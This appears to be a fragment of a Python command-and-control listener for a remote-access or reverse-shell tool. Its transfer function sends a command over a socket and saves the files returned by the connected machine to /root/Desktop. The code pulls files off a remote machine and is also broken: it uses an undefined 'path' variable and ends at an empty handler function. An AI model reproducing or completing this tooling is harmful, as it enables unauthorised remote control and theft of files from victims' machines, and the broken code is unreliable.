import socket
import threading
import os

def transfer(conn, command):
    conn.send(command.encode()) # send command to connection
    f = open('/root/Desktop'+path,'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith("DONE".encode()):
            f.write(bits[:-4]) # write out bits and remove DONE
            f.close()
            print("[+]Transfer Completed")
            break
        if "File not found".encode() in bits:
            print("[-]Unable to find the file")
            break
        f.write(bits)

def handler():

